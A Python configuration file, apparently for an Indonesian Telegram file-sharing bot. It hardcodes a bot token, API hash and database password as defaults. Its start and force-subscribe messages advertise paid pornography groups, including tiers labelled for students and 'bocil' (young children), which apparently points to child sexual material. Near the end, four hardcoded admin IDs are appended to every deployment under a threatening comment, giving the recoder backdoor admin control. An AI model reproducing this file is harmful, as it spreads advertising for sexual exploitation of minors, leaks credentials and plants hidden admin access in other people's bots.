# (©)Codexbotz
# Recode by @mrismanaziz
# t.me/SharingUserbot & t.me/Lunatic0de

import logging
import os
from distutils.util import strtobool
from dotenv import load_dotenv
from logging.handlers import RotatingFileHandler

load_dotenv("config.env")

# Bot token dari @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "6542544254:AAHNr4TYouDLkQo5o7mb8LMVKSHTIPvd4sE")

# API ID Anda dari my.telegram.org
APP_ID = int(os.environ.get("APP_ID", "11381402"))

# API Hash Anda dari my.telegram.org
API_HASH = os.environ.get("API_HASH", "349d6f6868d82dc82c7a9b356051f035")

# ID Channel Database
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "-1001545619646"))

# NAMA OWNER
OWNER = os.environ.get("OWNER", "0")

# Protect Content
PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "False"))

# Heroku Credentials for updater.
HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)

# Custom Repo for updater.
UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "master")

# Database
DB_URI = os.environ.get("DATABASE_URL", "postgres://mcyhqjyp:u-vk6yHroCSnpRBXdok7UZMmqhQ-Gciu@jelani.db.elephantsql.com/mcyhqjyp")

# ID dari Channel Atau Group Untuk Wajib Subscribenya
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "-1002098537869"))
FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "-1001507452900"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

# Pesan Awalan /start
START_MSG = os.environ.get(
    "START_MESSAGE",
    "<b>Hello {first}</b>\n\n<b>Saya dapat menyimpan file pribadi di Channel Tertentu dan pengguna lain dapat mengaksesnya dari link khusus.</b>\n\n<b>🛑SPECIAL PROMO GRUB VVIP🛑\n\n✨VVIP INDO 50K✨\n✨VVIP BARAT 50K✨\n✨VVIP JAV 50K✨\n✨VVIP SPECIAL 50K✨\n✨VVIP COLMEK 50K✨\n✨VVIP ONLYFANS 50K✨\n✨VVIP CAMPURAN 50K✨\n✨VVIP BDSM 50K✨\n✨HIJAB 50K✨\n✨PELAJAR 50K✨\n✨VVIP SULTAN 100K✨\n✨VVIP PREMIUM SULTAN 200K✨\n✨VVIP BOCIL 150K✨\nVVIP SULTAN 20000+MEDIA\nVVIP PREMIUM SULTAN 38.000+MEDIA UPDATE SETIAP SAAT\n\n\n\nPAYMENT:\n🤑DANA\n💷OVO\n🛵 GOPAY\n\nKEUNTUNGAN JOIN VIP ⤵️\n✅ BERGARANSI\n✅ NONTON VIDEO TANPA LINK\n✅ PERMANENT\n✅ UPDATE SETIAP SAAT\n✅ CUKUP SEKALI BAYAR NONTON SEPUASNYA\n\n📞ADMIN: @serly69 📞\nᴊɪᴋᴀ ᴀɴᴅᴀ ʟɪᴍɪᴛ ʙɪꜱᴀ ᴘᴄ ʙᴏᴛ ᴄᴜꜱᴛᴏᴍᴇʀ ꜱᴇʀᴠɪᴄᴇ\nᴏʀᴅᴇʀ ᴠɪᴀ ʙᴏᴛ 💐\nʟᴀɴɢꜱᴜɴɢ ᴘᴄ\n└»  @clayasisten_bot</b>",
)
try:
    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "6207221547 1962436343 5521355570 6839082735").split())]
except ValueError:
    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")

# Pesan Saat Memaksa Subscribe
FORCE_MSG = os.environ.get(
    "FORCE_SUB_MESSAGE",
    "<b>Hello {first}\n\nAnda harus bergabung di Channel/Grup saya Terlebih dahulu untuk Melihat File yang saya Bagikan\n\nSilakan Join Ke Channel & Group Terlebih Dahulu</b>\n\n<b>🛑SPECIAL PROMO GRUB VVIP🛑\n\n✨VVIP INDO 50K✨\n✨VVIP BARAT 50K✨\n✨VVIP JAV 50K✨\n✨VVIP SPECIAL 50K✨\n✨VVIP COLMEK 50K✨\n✨VVIP ONLYFANS 50K✨\n✨VVIP CAMPURAN 50K✨\n✨VVIP BDSM 50K✨\n✨HIJAB 50K✨\n✨PELAJAR 50K✨\n✨VVIP SULTAN 100K✨\n✨VVIP PREMIUM SULTAN 200K✨\n✨VVIP BOCIL 150K✨\nVVIP SULTAN 20000+MEDIA\nVVIP PREMIUM SULTAN 38.000+MEDIA UPDATE SETIAP SAAT\n\n\n\nPAYMENT:\n🤑DANA\n💷OVO\n🛵 GOPAY\n\nKEUNTUNGAN JOIN VIP ⤵️\n✅ BERGARANSI\n✅ NONTON VIDEO TANPA LINK\n✅ PERMANENT\n✅ UPDATE SETIAP SAAT\n✅ CUKUP SEKALI BAYAR NONTON SEPUASNYA\n\n📞ADMIN: @serly69 📞\nᴊɪᴋᴀ ᴀɴᴅᴀ ʟɪᴍɪᴛ ʙɪꜱᴀ ᴘᴄ ʙᴏᴛ ᴄᴜꜱᴛᴏᴍᴇʀ ꜱᴇʀᴠɪᴄᴇ\nᴏʀᴅᴇʀ ᴠɪᴀ ʙᴏᴛ 💐\nʟᴀɴɢꜱᴜɴɢ ᴘᴄ\n└»  @clayasisten_bot</b>",
)

# Atur Teks Kustom Anda di sini, Simpan (None) untuk Menonaktifkan Teks Kustom
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

# Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))

# Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
# Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
ADMINS.extend((844432220, 1250450587, 1750080384, 182990552))


LOG_FILE_NAME = "logs.txt"
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
